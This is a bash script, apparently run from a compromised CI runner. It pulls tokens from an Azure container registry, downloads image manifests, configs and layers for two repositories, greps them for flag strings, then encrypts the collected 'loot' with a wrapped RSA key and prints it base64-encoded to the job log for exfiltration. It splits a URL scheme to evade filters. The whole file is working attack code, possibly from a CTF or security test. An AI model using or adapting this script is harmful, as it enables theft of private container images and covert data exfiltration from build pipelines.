#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
ACR=crtblplatprodx3euoz.azurecr.io
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
ACC='application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json'
for R in catalog-api tebamoto-reporting-api; do
  say "############ REPO $R"
  T=$(curl -sS "${SC}${ACR}/oauth2/token?service=${ACR}&scope=repository:${R}:pull" | jq -r '.access_token // empty')
  say "TOK ${T:0:8}"
  say "TAGS: $(curl -sS -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/tags/list")"
  for TAG in $(curl -sS -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/tags/list" | jq -r '.tags[]? // empty'); do
    say "---- $R:$TAG ----"
    M=$(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${TAG}")
    say "MANIFEST: $(echo "$M" | head -c 1200)"
    DIGESTS=$(echo "$M" | jq -r '.manifests[]?.digest // empty')
    if [ -n "$DIGESTS" ]; then
      for D in $DIGESTS; do
        say "CHILD $D: $(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${D}" | head -c 1500)"
      done
    fi
    LAYERS=$(echo "$M" | jq -r '.layers[]?.digest // empty')
    CFG=$(echo "$M" | jq -r '.config.digest // empty')
    if [ -n "$CFG" ]; then
      say "CONFIG: $(curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${CFG}" | head -c 3000)"
    fi
    for L in $LAYERS; do
      say "LAYER $L:"
      curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${L}" -o /tmp/L.tgz
      say "  size=$(wc -c </tmp/L.tgz)"
      tar -tzf /tmp/L.tgz 2>/dev/null | head -40 | sed 's/^/  f: /'
      tar -xzf /tmp/L.tgz -O 2>/dev/null | grep -aioE 'flag\{[^}]{0,120}\}|FLAG\{[^}]{0,120}\}|flag[=: "][^ "]{0,120}' | head -20 | sed 's/^/  HIT: /'
    done
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
